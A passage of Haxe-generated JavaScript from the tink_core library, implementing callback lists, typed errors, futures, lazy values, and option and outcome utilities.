		} else if(this.used == 0) {
			this.resize(0);
			var fn = this.ondrain;
			if(tink_core_Callback.depth < 500) {
				tink_core_Callback.depth++;
				fn();
				tink_core_Callback.depth--;
			} else {
				tink_core_Callback.defer(fn);
			}
		} else {
			var compacted = 0;
			var _g = 0;
			var _g1 = this.cells.length;
			while(_g < _g1) {
				var i = _g++;
				var _g2 = this.cells[i];
				var _g3 = _g2.list;
				if(_g2.cb != null) {
					var v = _g2;
					if(compacted != i) {
						this.cells[compacted] = v;
					}
					if(++compacted == this.used) {
						break;
					}
				}
			}
			this.resize(this.used);
		}
	}
	,resize: function(length) {
		this.cells.length = length;
	}
	,clear: function() {
		if(this.busy) {
			this.queue.push($bind(this,this.clear));
		}
		var _g = 0;
		var _g1 = this.cells;
		while(_g < _g1.length) {
			var cell = _g1[_g];
			++_g;
			cell.cb = null;
			cell.list = null;
		}
		this.resize(0);
	}
	,__class__: tink_core_CallbackList
});
var tink_core_AlreadyDisposed = function() {
};
tink_core_AlreadyDisposed.__name__ = true;
tink_core_AlreadyDisposed.__interfaces__ = [tink_core_OwnedDisposable];
tink_core_AlreadyDisposed.prototype = {
	get_disposed: function() {
		return true;
	}
	,ondispose: function(d) {
		d();
	}
	,dispose: function() {
	}
	,__class__: tink_core_AlreadyDisposed
};
var tink_core_TypedError = function(code,message,pos) {
	if(code == null) {
		code = 500;
	}
	this.isTinkError = true;
	this.code = code;
	this.message = message;
	this.pos = pos;
	this.exceptionStack = [];
	this.callStack = [];
};
tink_core_TypedError.__name__ = true;
tink_core_TypedError.withData = function(code,message,data,pos) {
	return tink_core_TypedError.typed(code,message,data,pos);
};
tink_core_TypedError.typed = function(code,message,data,pos) {
	var ret = new tink_core_TypedError(code,message,pos);
	ret.data = data;
	return ret;
};
tink_core_TypedError.ofJsError = function(e,pos) {
	return tink_core_TypedError.withData(500,e.message,e,pos);
};
tink_core_TypedError.asError = function(v) {
	if(v != null && v.isTinkError) {
		return v;
	} else {
		return null;
	}
};
tink_core_TypedError.catchExceptions = function(f,report,pos) {
	try {
		return tink_core_Outcome.Success(f());
	} catch( _g ) {
		var e = haxe_Exception.caught(_g).unwrap();
		var e1 = tink_core_TypedError.asError(e);
		var tmp;
		if(e1 == null) {
			tmp = report == null ? tink_core_TypedError.withData(null,"Unexpected Error",e1,pos) : report(e1);
		} else {
			var e = e1;
			tmp = e;
		}
		return tink_core_Outcome.Failure(tmp);
	}
};
tink_core_TypedError.reporter = function(code,message,pos) {
	return function(e) {
		return tink_core_TypedError.withData(code,message,e,pos);
	};
};
tink_core_TypedError.rethrow = function(any) {
	throw haxe_Exception.thrown(any);
};
tink_core_TypedError.tryFinally = function(f,cleanup) {
	try { return f(); } finally { cleanup(); }
	return null;
};
tink_core_TypedError.prototype = {
	printPos: function() {
		return this.pos.className + "." + this.pos.methodName + ":" + this.pos.lineNumber;
	}
	,toString: function() {
		var ret = "Error#" + this.code + ": " + this.message;
		if(this.pos != null) {
			ret += " @ " + this.printPos();
		}
		return ret;
	}
	,toPromise: function() {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(this)));
	}
	,throwSelf: function() {
		var any = this;
		throw haxe_Exception.thrown(any);
	}
	,toJsError: function() {
		var value = this.data;
		var _g = ((value) instanceof Error) ? value : null;
		if(_g == null) {
			return new tink_core__$Error_TinkError(this);
		} else {
			var e = _g;
			return e;
		}
	}
	,__class__: tink_core_TypedError
};
var tink_core_Stack = {};
tink_core_Stack.toString = function(this1) {
	return "Error stack not available. Compile with -D error_stack.";
};
var tink_core__$Error_TinkError = function(e) {
	Error.call(this);
	this.message = e.message;
	this.data = e;
};
tink_core__$Error_TinkError.__name__ = true;
tink_core__$Error_TinkError.__super__ = Error;
tink_core__$Error_TinkError.prototype = $extend(Error.prototype,{
	__class__: tink_core__$Error_TinkError
});
var tink_core__$Future_FutureObject = function() { };
tink_core__$Future_FutureObject.__name__ = true;
tink_core__$Future_FutureObject.__isInterface__ = true;
tink_core__$Future_FutureObject.prototype = {
	__class__: tink_core__$Future_FutureObject
};
var tink_core__$Future_NeverFuture = function() {
};
tink_core__$Future_NeverFuture.__name__ = true;
tink_core__$Future_NeverFuture.__interfaces__ = [tink_core__$Future_FutureObject];
tink_core__$Future_NeverFuture.prototype = {
	getStatus: function() {
		return tink_core_FutureStatus.NeverEver;
	}
	,handle: function(callback) {
		return null;
	}
	,eager: function() {
	}
	,__class__: tink_core__$Future_NeverFuture
};
var tink_core__$Lazy_Computable = function() { };
tink_core__$Lazy_Computable.__name__ = true;
tink_core__$Lazy_Computable.__isInterface__ = true;
tink_core__$Lazy_Computable.prototype = {
	__class__: tink_core__$Lazy_Computable
};
var tink_core__$Lazy_LazyObject = function() { };
tink_core__$Lazy_LazyObject.__name__ = true;
tink_core__$Lazy_LazyObject.__isInterface__ = true;
tink_core__$Lazy_LazyObject.__interfaces__ = [tink_core__$Lazy_Computable];
tink_core__$Lazy_LazyObject.prototype = {
	__class__: tink_core__$Lazy_LazyObject
};
var tink_core__$Lazy_LazyConst = function(value) {
	this.value = value;
};
tink_core__$Lazy_LazyConst.__name__ = true;
tink_core__$Lazy_LazyConst.__interfaces__ = [tink_core__$Lazy_LazyObject];
tink_core__$Lazy_LazyConst.prototype = {
	isComputed: function() {
		return true;
	}
	,get: function() {
		return this.value;
	}
	,compute: function() {
	}
	,underlying: function() {
		return null;
	}
	,__class__: tink_core__$Lazy_LazyConst
};
var tink_core__$Future_SyncFuture = function(value) {
	this.value = value;
};
tink_core__$Future_SyncFuture.__name__ = true;
tink_core__$Future_SyncFuture.__interfaces__ = [tink_core__$Future_FutureObject];
tink_core__$Future_SyncFuture.prototype = {
	getStatus: function() {
		return tink_core_FutureStatus.Ready(this.value);
	}
	,handle: function(cb) {
		tink_core_Callback.invoke(cb,tink_core_Lazy.get(this.value));
		return null;
	}
	,eager: function() {
		if(!this.value.isComputed()) {
			tink_core_Lazy.get(this.value);
		}
	}
	,__class__: tink_core__$Future_SyncFuture
};
var tink_core_Future = {};
tink_core_Future.get_status = function(this1) {
	return this1.getStatus();
};
tink_core_Future._new = function(wakeup) {
	var this1 = new tink_core__$Future_SuspendableFuture(wakeup);
	return this1;
};
tink_core_Future.handle = function(this1,callback) {
	return this1.handle(callback);
};
tink_core_Future.eager = function(this1) {
	this1.eager();
	return this1;
};
tink_core_Future.noise = function(this1) {
	if(this1.getStatus()._hx_index == 4) {
		return tink_core_Future.NEVER;
	} else {
		return tink_core_Future.map(this1,function(_) {
			return null;
		});
	}
};
tink_core_Future.first = function(this1,that) {
	var _g = this1;
	var _g1 = _g.getStatus();
	switch(_g1._hx_index) {
	case 3:
		var _g2 = _g1.result;
		var _g1 = that.getStatus();
		switch(_g1._hx_index) {
		case 3:
			var _g2 = _g1.result;
			var v = _g;
			return v;
		case 4:
			var v = _g;
			return v;
		default:
			var v = _g;
			return v;
		}
		break;
	case 4:
		var v = that;
		return v;
	default:
		var _g1 = that.getStatus();
		switch(_g1._hx_index) {
		case 3:
			var _g2 = _g1.result;
			var v = that;
			return v;
		case 4:
			var v = _g;
			return v;
		default:
			return new tink_core__$Future_SuspendableFuture(function(fire) {
				return new tink_core__$Callback_LinkPair(this1.handle(fire),that.handle(fire));
			});
		}
	}
};
tink_core_Future.map = function(this1,f,gather) {
	var _g = this1.getStatus();
	switch(_g._hx_index) {
	case 3:
		var l = _g.result;
		var this2 = l;
		var f1 = f;
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyFunc(function() {
			return f1(this2.get());
		},this2));
	case 4:
		return tink_core_Future.NEVER;
	default:
		return new tink_core__$Future_SuspendableFuture(function(fire) {
			return this1.handle(function(v) {
				fire(f(v));
			});
		});
	}
};
tink_core_Future.flatMap = function(this1,next,gather) {
	var _g = this1.getStatus();
	switch(_g._hx_index) {
	case 3:
		var l = _g.result;
		return new tink_core__$Future_SuspendableFuture(function(fire) {
			return next(tink_core_Lazy.get(l)).handle(function(v) {
				fire(v);
			});
		});
	case 4:
		return tink_core_Future.NEVER;
	default:
		return new tink_core__$Future_SuspendableFuture(function($yield) {
			var inner = new tink_core_CallbackLinkRef();
			var outer = this1.handle(function(v) {
				var outer = next(v).handle($yield);
				inner.link = outer;
			});
			return new tink_core__$Callback_LinkPair(outer,inner);
		});
	}
};
tink_core_Future.next = function(this1,n) {
	return tink_core_Future.flatMap(this1,n);
};
tink_core_Future.gather = function(this1) {
	return this1;
};
tink_core_Future.merge = function(this1,that,combine) {
	var _g = this1.getStatus();
	var _g1 = that.getStatus();
	if(_g._hx_index == 4) {
		return tink_core_Future.NEVER;
	} else if(_g1._hx_index == 4) {
		return tink_core_Future.NEVER;
	} else {
		return new tink_core__$Future_SuspendableFuture(function($yield) {
			var check = function(v) {
				var _g = this1.getStatus();
				var _g1 = that.getStatus();
				if(_g._hx_index == 3) {
					if(_g1._hx_index == 3) {
						var b = _g1.result;
						var a = _g.result;
						$yield(combine(tink_core_Lazy.get(a),tink_core_Lazy.get(b)));
					}
				}
			};
			return new tink_core__$Callback_LinkPair(this1.handle(check),that.handle(check));
		});
	}
};
tink_core_Future.flatten = function(f) {
	return tink_core_Future.flatMap(f,function(v) {
		return v;
	});
};
tink_core_Future.ofJsPromise = function(promise) {
	return tink_core_Future.irreversible(function(cb) {
		promise.then(function(a) {
			var _g = cb;
			var a1 = tink_core_Outcome.Success(a);
			tink_core_Callback.defer(function() {
				_g(a1);
			});
		},function(e) {
			cb(tink_core_Outcome.Failure(tink_core_TypedError.withData(null,e.message,e,{ fileName : "tink/core/Future.hx", lineNumber : 158, className : "tink.core._Future.Future_Impl_", methodName : "ofJsPromise"})));
		});
	});
};
tink_core_Future.neverToAny = function(l) {
	return l;
};
tink_core_Future.ofAny = function(v) {
	return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(v));
};
tink_core_Future.asPromise = function(s) {
	return s;
};
tink_core_Future.ofMany = function(futures,gather) {
	return tink_core_Future.inSequence(futures);
};
tink_core_Future.inParallel = function(futures,concurrency) {
	return tink_core_Future.many(futures,concurrency);
};
tink_core_Future.inSequence = function(futures) {
	return tink_core_Future.many(futures,1);
};
tink_core_Future.many = function(a,concurrency) {
	return tink_core_Future.processMany(a,concurrency,tink_core_Outcome.Success,function(o) {
		return tink_core_OutcomeTools.orNull(o);
	});
};
tink_core_Future.processMany = function(a,concurrency,fn,lift) {
	if(a.length == 0) {
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(lift(tink_core_Outcome.Success([]))));
	} else {
		var this1 = new tink_core__$Future_SuspendableFuture(function($yield) {
			var links = [];
			var _g = [];
			var _g1 = 0;
			while(_g1 < a.length) {
				var x = a[_g1];
				++_g1;
				_g.push(null);
			}
			var ret = _g;
			var index = 0;
			var pending = 0;
			var done = false;
			var concurrency1;
			if(concurrency == null) {
				concurrency1 = a.length;
			} else {
				var v = concurrency;
				concurrency1 = v < 1 ? 1 : v > a.length ? a.length : v;
			}
			var fireWhenReady = function() {
				if(index == ret.length) {
					if(pending == 0) {
						var v = lift(tink_core_Outcome.Success(ret));
						done = true;
						$yield(v);
						return true;
					} else {
						return false;
					}
				} else {
					return false;
				}
			};
			var step = null;
			step = function() {
				if(!done && !fireWhenReady()) {
					while(index < ret.length) {
						index += 1;
						var index1 = [index - 1];
						var p = a[index1[0]];
						var check = [(function(index) {
							return function(o) {
								var _g = fn(o);
								switch(_g._hx_index) {
								case 0:
									var v = _g.data;
									ret[index[0]] = v;
									fireWhenReady();
									break;
								case 1:
									var e = _g.failure;
									var _g = 0;
									while(_g < links.length) {
										var l = links[_g];
										++_g;
										if(l != null) {
											l.cancel();
										}
									}
									var v = lift(tink_core_Outcome.Failure(e));
									done = true;
									$yield(v);
									break;
								}
							};
						})(index1)];
						var _g = p.getStatus();
						if(_g._hx_index == 3) {
							var _hx_tmp;
							_hx_tmp = tink_core_Lazy.get(_g.result);
							var v = _hx_tmp;
							check[0](v);
							if(!done) {
								continue;
							}
						} else {
							pending += 1;
							links.push(p.handle((function(check) {
								return function(o) {
									pending -= 1;
									check[0](o);
									if(!done) {
										step();
									}
								};
							})(check)));
						}
						break;
					}
				}
			};
			var _g = 0;
			var _g1 = concurrency1;
			while(_g < _g1) {
				var i = _g++;
				step();
			}
			return tink_core_CallbackLink.fromMany(links);
		});
		return this1;
	}
};
tink_core_Future.lazy = function(l) {
	return new tink_core__$Future_SyncFuture(l);
};
tink_core_Future.sync = function(v) {
	return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(v));
};
tink_core_Future.isFuture = function(maybeFuture) {
	return js_Boot.__implements(maybeFuture,tink_core__$Future_FutureObject);
};
tink_core_Future.async = function(init,lazy) {
	if(lazy == null) {
		lazy = false;
	}
	var ret = tink_core_Future.irreversible(init);
	if(lazy) {
		return ret;
	} else {
		ret.eager();
		return ret;
	}
};
tink_core_Future.irreversible = function(init) {
	return new tink_core__$Future_SuspendableFuture(function($yield) {
		init($yield);
		return null;
	});
};
tink_core_Future.or = function(a,b) {
	return tink_core_Future.first(a,b);
};
tink_core_Future.either = function(a,b) {
	return tink_core_Future.first(tink_core_Future.map(a,haxe_ds_Either.Left),tink_core_Future.map(b,haxe_ds_Either.Right));
};
tink_core_Future.and = function(a,b) {
	return tink_core_Future.merge(a,b,function(a,b) {
		var this1 = new tink_core_MPair(a,b);
		return this1;
	});
};
tink_core_Future._tryFailingFlatMap = function(f,map) {
	return tink_core_Future.flatMap(f,function(o) {
		switch(o._hx_index) {
		case 0:
			var d = o.data;
			return map(d);
		case 1:
			var f = o.failure;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(f)));
		}
	});
};
tink_core_Future._tryFlatMap = function(f,map) {
	return tink_core_Future.flatMap(f,function(o) {
		switch(o._hx_index) {
		case 0:
			var d = o.data;
			return tink_core_Future.map(map(d),tink_core_Outcome.Success);
		case 1:
			var f = o.failure;
			return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(f)));
		}
	});
};
tink_core_Future._tryFailingMap = function(f,map) {
	return tink_core_Future.map(f,function(o) {
		return tink_core_OutcomeTools.flatMap(o,tink_core__$Outcome_OutcomeMapper.withSameError(map));
	});
};
tink_core_Future._tryMap = function(f,map) {
	return tink_core_Future.map(f,function(o) {
		return tink_core_OutcomeTools.map(o,map);
	});
};
tink_core_Future._flatMap = function(f,map) {
	return tink_core_Future.flatMap(f,map);
};
tink_core_Future._map = function(f,map) {
	return tink_core_Future.map(f,map);
};
tink_core_Future.trigger = function() {
	return new tink_core_FutureTrigger();
};
tink_core_Future.delay = function(ms,value) {
	var this1 = tink_core_Future.irreversible(function(cb) {
		haxe_Timer.delay(function() {
			cb(tink_core_Lazy.get(value));
		},ms);
	});
	this1.eager();
	return this1;
};
var tink_core_FutureStatus = $hxEnums["tink.core.FutureStatus"] = { __ename__:true,__constructs__:null
	,Suspended: {_hx_name:"Suspended",_hx_index:0,__enum__:"tink.core.FutureStatus",toString:$estr}
	,Awaited: {_hx_name:"Awaited",_hx_index:1,__enum__:"tink.core.FutureStatus",toString:$estr}
	,EagerlyAwaited: {_hx_name:"EagerlyAwaited",_hx_index:2,__enum__:"tink.core.FutureStatus",toString:$estr}
	,Ready: ($_=function(result) { return {_hx_index:3,result:result,__enum__:"tink.core.FutureStatus",toString:$estr}; },$_._hx_name="Ready",$_.__params__ = ["result"],$_)
	,NeverEver: {_hx_name:"NeverEver",_hx_index:4,__enum__:"tink.core.FutureStatus",toString:$estr}
};
tink_core_FutureStatus.__constructs__ = [tink_core_FutureStatus.Suspended,tink_core_FutureStatus.Awaited,tink_core_FutureStatus.EagerlyAwaited,tink_core_FutureStatus.Ready,tink_core_FutureStatus.NeverEver];
var tink_core_FutureTrigger = function() {
	this.status = tink_core_FutureStatus.Awaited;
	this.list = new tink_core_CallbackList(true);
};
tink_core_FutureTrigger.__name__ = true;
tink_core_FutureTrigger.__interfaces__ = [tink_core__$Future_FutureObject];
tink_core_FutureTrigger.prototype = {
	getStatus: function() {
		return this.status;
	}
	,handle: function(callback) {
		var _g = this.status;
		if(_g._hx_index == 3) {
			var result = _g.result;
			tink_core_Callback.invoke(callback,tink_core_Lazy.get(result));
			return null;
		} else {
			var v = _g;
			var _this = this.list;
			if(_this.disposeHandlers == null) {
				return null;
			} else {
				var node = new tink_core__$Callback_ListCell(callback,_this);
				_this.cells.push(node);
				if(_this.used++ == 0) {
					var fn = _this.onfill;
					if(tink_core_Callback.depth < 500) {
						tink_core_Callback.depth++;
						fn();
						tink_core_Callback.depth--;
					} else {
						tink_core_Callback.defer(fn);
					}
				}
				return node;
			}
		}
	}
	,eager: function() {
	}
	,asFuture: function() {
		return this;
	}
	,trigger: function(result) {
		var _g = this.status;
		if(_g._hx_index == 3) {
			var _g1 = _g.result;
			return false;
		} else {
			this.status = tink_core_FutureStatus.Ready(new tink_core__$Lazy_LazyConst(result));
			this.list.invoke(result);
			return true;
		}
	}
	,__class__: tink_core_FutureTrigger
};
var tink_core_JsPromiseTools = function() { };
tink_core_JsPromiseTools.__name__ = true;
tink_core_JsPromiseTools.toSurprise = function(promise) {
	return tink_core_Future.ofJsPromise(promise);
};
tink_core_JsPromiseTools.toPromise = function(promise) {
	return tink_core_Future.ofJsPromise(promise);
};
var tink_core__$Future_SuspendableFuture = function(wakeup) {
	this.status = tink_core_FutureStatus.Suspended;
	var _gthis = this;
	this.wakeup = wakeup;
	this.callbacks = new tink_core_CallbackList(true);
	this.callbacks.ondrain = function() {
		if(_gthis.status == tink_core_FutureStatus.Awaited) {
			_gthis.status = tink_core_FutureStatus.Suspended;
			var this1 = _gthis.link;
			if(this1 != null) {
				this1.cancel();
			}
			_gthis.link = null;
		}
	};
	this.callbacks.onfill = function() {
		if(_gthis.status == tink_core_FutureStatus.Suspended) {
			_gthis.status = tink_core_FutureStatus.Awaited;
			_gthis.arm();
		}
	};
};
tink_core__$Future_SuspendableFuture.__name__ = true;
tink_core__$Future_SuspendableFuture.__interfaces__ = [tink_core__$Future_FutureObject];
tink_core__$Future_SuspendableFuture.prototype = {
	getStatus: function() {
		return this.status;
	}
	,trigger: function(value) {
		var _g = this.status;
		if(_g._hx_index == 3) {
			var _g1 = _g.result;
		} else {
			this.status = tink_core_FutureStatus.Ready(new tink_core__$Lazy_LazyConst(value));
			var link = this.link;
			this.link = null;
			this.wakeup = null;
			this.callbacks.invoke(value);
			if(link != null) {
				link.cancel();
			}
		}
	}
	,handle: function(callback) {
		var _g = this.status;
		if(_g._hx_index == 3) {
			var result = _g.result;
			tink_core_Callback.invoke(callback,tink_core_Lazy.get(result));
			return null;
		} else {
			var _this = this.callbacks;
			if(_this.disposeHandlers == null) {
				return null;
			} else {
				var node = new tink_core__$Callback_ListCell(callback,_this);
				_this.cells.push(node);
				if(_this.used++ == 0) {
					var fn = _this.onfill;
					if(tink_core_Callback.depth < 500) {
						tink_core_Callback.depth++;
						fn();
						tink_core_Callback.depth--;
					} else {
						tink_core_Callback.defer(fn);
					}
				}
				return node;
			}
		}
	}
	,arm: function() {
		var _gthis = this;
		this.link = this.wakeup(function(x) {
			_gthis.trigger(x);
		});
	}
	,eager: function() {
		switch(this.status._hx_index) {
		case 0:
			this.status = tink_core_FutureStatus.EagerlyAwaited;
			this.arm();
			break;
		case 1:
			this.status = tink_core_FutureStatus.EagerlyAwaited;
			break;
		default:
		}
	}
	,__class__: tink_core__$Future_SuspendableFuture
};
var tink_core_Lazy = {};
tink_core_Lazy.get_computed = function(this1) {
	return this1.isComputed();
};
tink_core_Lazy.get = function(this1) {
	this1.compute();
	return this1.get();
};
tink_core_Lazy.fromNoise = function(l) {
	return l;
};
tink_core_Lazy.ofFunc = function(f) {
	return new tink_core__$Lazy_LazyFunc(f);
};
tink_core_Lazy.map = function(this1,f) {
	return new tink_core__$Lazy_LazyFunc(function() {
		return f(this1.get());
	},this1);
};
tink_core_Lazy.flatMap = function(this1,f) {
	return new tink_core__$Lazy_LazyFunc(function() {
		return tink_core_Lazy.get(f(this1.get()));
	},this1);
};
tink_core_Lazy.ofConst = function(c) {
	return new tink_core__$Lazy_LazyConst(c);
};
var tink_core__$Lazy_LazyFunc = function(f,from) {
	this.f = f;
	this.from = from;
};
tink_core__$Lazy_LazyFunc.__name__ = true;
tink_core__$Lazy_LazyFunc.__interfaces__ = [tink_core__$Lazy_LazyObject];
tink_core__$Lazy_LazyFunc.prototype = {
	underlying: function() {
		return this.from;
	}
	,isComputed: function() {
		return this.f == null;
	}
	,get: function() {
		return this.result;
	}
	,compute: function() {
		var _g = this.f;
		if(_g != null) {
			var v = _g;
			this.f = null;
			var _g = this.from;
			if(_g != null) {
				var cur = _g;
				this.from = null;
				var stack = [];
				while(cur != null && !cur.isComputed()) {
					stack.push(cur);
					cur = cur.underlying();
				}
				stack.reverse();
				var _g = 0;
				while(_g < stack.length) {
					var c = stack[_g];
					++_g;
					c.compute();
				}
			}
			this.result = v();
		}
	}
	,__class__: tink_core__$Lazy_LazyFunc
};
var tink_core_NamedWith = function(name,value) {
	this.name = name;
	this.value = value;
};
tink_core_NamedWith.__name__ = true;
tink_core_NamedWith.prototype = {
	__class__: tink_core_NamedWith
};
var tink_core_Noise = {};
tink_core_Noise.ofAny = function(t) {
	return null;
};
var tink_core_OptionTools = function() { };
tink_core_OptionTools.__name__ = true;
tink_core_OptionTools.force = function(o,pos) {
	if(o._hx_index == 0) {
		var v = o.v;
		return v;
	} else {
		throw haxe_Exception.thrown(new tink_core_TypedError(404,"Some value expected but none found",pos));
	}
};
tink_core_OptionTools.sure = function(o,pos) {
	if(o._hx_index == 0) {
		var v = o.v;
		return v;
	} else {
		throw haxe_Exception.thrown(new tink_core_TypedError(404,"Some value expected but none found",pos));
	}
};
tink_core_OptionTools.toOutcome = function(o,pos) {
	switch(o._hx_index) {
	case 0:
		var value = o.v;
		return tink_core_Outcome.Success(value);
	case 1:
		return tink_core_Outcome.Failure(new tink_core_TypedError(404,"Some value expected but none found in " + pos.fileName + "@line " + pos.lineNumber,{ fileName : "tink/core/Option.hx", lineNumber : 31, className : "tink.core.OptionTools", methodName : "toOutcome"}));
	}
};
tink_core_OptionTools.or = function(o,l) {
	if(o._hx_index == 0) {
		var v = o.v;
		return v;
	} else {
		return tink_core_Lazy.get(l);
	}
};
tink_core_OptionTools.orTry = function(o,fallback) {
	if(o._hx_index == 0) {
		var v = o.v;
		return o;
	} else {
		return tink_core_Lazy.get(fallback);
	}
};
tink_core_OptionTools.orNull = function(o) {
	if(o._hx_index == 0) {
		var v = o.v;
		return v;
	} else {
		return null;
	}
};
tink_core_OptionTools.filter = function(o,f) {
	if(o._hx_index == 0) {
		if(f(o.v) == false) {
			return haxe_ds_Option.None;
		} else {
			return o;
		}
	} else {
		return o;
	}
};
tink_core_OptionTools.satisfies = function(o,f) {
	if(o._hx_index == 0) {
		var v = o.v;
		return f(v);
	} else {
		return false;
	}
};
tink_core_OptionTools.equals = function(o,v) {
	if(o._hx_index == 0) {
		var v1 = o.v;
		return v1 == v;
	} else {
		return false;
	}
};
tink_core_OptionTools.map = function(o,f) {
	if(o._hx_index == 0) {
		var v = o.v;
		return haxe_ds_Option.Some(f(v));
	} else {
		return haxe_ds_Option.None;
	}
};
tink_core_OptionTools.flatMap = function(o,f) {
	if(o._hx_index == 0) {
		var v = o.v;
		return f(v);
	} else {
		return haxe_ds_Option.None;
	}
};
tink_core_OptionTools.iterator = function(o) {
	return new tink_core_OptionIter(o);
};
tink_core_OptionTools.toArray = function(o) {
	if(o._hx_index == 0) {
		var v = o.v;
		return [v];
	} else {
		return [];
	}
};
var tink_core_OptionIter = function(o) {
	this.alive = true;
	if(o._hx_index == 0) {
		var v = o.v;
		this.value = v;
	} else {
		this.alive = false;
	}
};
tink_core_OptionIter.__name__ = true;
tink_core_OptionIter.prototype = {
	hasNext: function() {
		return this.alive;
	}
	,next: function() {
		this.alive = false;
		return this.value;
	}
	,__class__: tink_core_OptionIter
};
var tink_core_Outcome = $hxEnums["tink.core.Outcome"] = { __ename__:true,__constructs__:null
	,Success: ($_=function(data) { return {_hx_index:0,data:data,__enum__:"tink.core.Outcome",toString:$estr}; },$_._hx_name="Success",$_.__params__ = ["data"],$_)
	,Failure: ($_=function(failure) { return {_hx_index:1,failure:failure,__enum__:"tink.core.Outcome",toString:$estr}; },$_._hx_name="Failure",$_.__params__ = ["failure"],$_)
};
tink_core_Outcome.__constructs__ = [tink_core_Outcome.Success,tink_core_Outcome.Failure];
var tink_core_OutcomeTools = function() { };
tink_core_OutcomeTools.__name__ = true;
tink_core_OutcomeTools.sure = function(outcome) {
	switch(outcome._hx_index) {
	case 0:
		var data = outcome.data;
		return data;
	case 1:
		var failure = outcome.failure;
		var _g = tink_core_TypedError.asError(failure);
		if(_g == null) {
			throw haxe_Exception.thrown(failure);
		} else {
			var e = _g;
			return e.throwSelf();
		}
		break;
	}
};
tink_core_OutcomeTools.toOption = function(outcome) {
	switch(outcome._hx_index) {
	case 0:
		var data = outcome.data;
		return haxe_ds_Option.Some(data);
	case 1:
		var _g = outcome.failure;
		return haxe_ds_Option.None;
	}
};
tink_core_OutcomeTools.orNull = function(outcome) {
	switch(outcome._hx_index) {
	case 0:
		var data = outcome.data;
		return data;
	case 1:
		var _g = outcome.failure;
		return null;
	}
};
tink_core_OutcomeTools.orUse = function(outcome,fallback) {
	return tink_core_OutcomeTools.or(outcome,fallback);
};
tink_core_OutcomeTools.or = function(outcome,fallback) {
	switch(outcome._hx_index) {
	case 0:
		var data = outcome.data;
		return data;
	case 1:
		var _g = outcome.failure;
		return tink_core_Lazy.get(fallback);
	}
};
tink_core_OutcomeTools.orTry = function(outcome,fallback) {
	switch(outcome._hx_index) {
	case 0:
		var _g = outcome.data;
		return outcome;
	case 1:
		var _g = outcome.failure;
		return tink_core_Lazy.get(fallback);
	}
};
tink_core_OutcomeTools.equals = function(outcome,to) {
	switch(outcome._hx_index) {
	case 0:
		var data = outcome.data;
		return data == to;
	case 1:
		var _g = outcome.failure;
		return false;
	}
};
tink_core_OutcomeTools.map = function(outcome,transform) {
	switch(outcome._hx_index) {
	case 0:
		var a = outcome.data;
		return tink_core_Outcome.Success(transform(a));
	case 1:
		var f = outcome.failure;
		return tink_core_Outcome.Failure(f);
	}
};
tink_core_OutcomeTools.isSuccess = function(outcome) {
	if(outcome._hx_index == 0) {
		var _g = outcome.data;
		return true;
	} else {
		return false;
	}
};
tink_core_OutcomeTools.flatMap = function(o,mapper) {
	return tink_core__$Outcome_OutcomeMapper.apply(mapper,o);
};
tink_core_OutcomeTools.swap = function(outcome,v) {
	switch(outcome._hx_index) {
	case 0:
		var a = outcome.data;
		return tink_core_Outcome.Success(v);
	case 1:
		var f = outcome.failure;
		return tink_core_Outcome.Failure(f);
	}
};
tink_core_OutcomeTools.next = function(outcome,f) {
	switch(outcome._hx_index) {
	case 0:
		var v = outcome.data;
		return f(v);
	case 1:
		var e = outcome.failure;
		return new tink_core__$Future_SyncFuture(new tink_core__$Lazy_LazyConst(tink_core_Outcome.Failure(e)));
	}
};
tink_core_OutcomeTools.attempt = function(f,report) {
	try {
		return tink_core_Outcome.Success(f());
	} catch( _g ) {
		var e = haxe_Exception.caught(_g).unwrap();
		return tink_core_Outcome.Failure(report(e));
	}
};
tink_core_OutcomeTools.flatten = function(o) {
	switch(o._hx_index) {
	case 0:
		var _g = o.data;
		switch(_g._hx_index) {
		case 0:
			var d = _g.data;
			return tink_core_Outcome.Success(d);
		case 1:
			var f = _g.failure;
			return tink_core_Outcome.Failure(f);
		}
		break;
	case 1:
		var f = o.failure;
		return tink_core_Outcome.Failure(f);
	}
};
var tink_core__$Outcome_OutcomeMapper = {};
tink_core__$Outcome_OutcomeMapper._new = function(f) {
	var this1 = { f : f};
	return this1;
};
tink_core__$Outcome_OutcomeMapper.apply = function(this1,o) {
	return this1.f(o);
};
tink_core__$Outcome_OutcomeMapper.withSameError = function(f) {
	return tink_core__$Outcome_OutcomeMapper._new(function(o) {
		switch(o._hx_index) {
		case 0:
			var d = o.data;
			return f(d);
		case 1:
			var f1 = o.failure;
			return tink_core_Outcome.Failure(f1);
		}
	});
};
tink_core__$Outcome_OutcomeMapper.withEitherError = function(f) {
	return tink_core__$Outcome_OutcomeMapper._new(function(o) {
		switch(o._hx_index) {
		case 0:
			var d = o.data;
			var _g = f(d);
			switch(_g._hx_index) {
			case 0:
				var d = _g.data;
				return tink_core_Outcome.Success(d);
			case 1:
				var f1 = _g.failure;
				return tink_core_Outcome.Failure(haxe_ds_Either.Right(f1));
			}
			break;
		case 1:
			var f1 = o.failure;
			return tink_core_Outcome.Failure(haxe_ds_Either.Left(f1));
		}
	});
};
var tink_core_Pair = {};
tink_core_Pair._new = function(a,b) {
	var this1 = new tink_core_MPair(a,b);
	return this1;
};
tink_core_Pair.get_a = function(this1) {
	return this1.a;
};
tink_core_Pair.get_b = function(this1) {
	return this1.b;
};
tink_core_Pair.toBool = function(this1) {
	return this1 != null;
};
tink_core_Pair.isNil = function(this1) {
	return this1 == null;
};
tink_core_Pair.nil = function() {
	return null;
};
var tink_core_MPair = function(a,b) {
	this.a = a;
	this.b = b;
};
tink_core_MPair.__name__ = true;
tink_core_MPair.prototype = {
	__class__: tink_core_MPair
};
var tink_core_ProgressValue = {};
tink_core_ProgressValue._new = function(value,total) {
	var this1 = new tink_core_MPair(value,total);
	var this2 = this1;
	return this2;
};
tink_core_ProgressValue.normalize = function(this1) {
	var o = this1.b;
	if(o._hx_index == 0) {
		var v = o.v;
		return haxe_ds_Option.Some(this1.a / v);
	} else {
		return haxe_ds_Option.None;
	}
};
tink_core_ProgressValue.get_value = function(this1) {
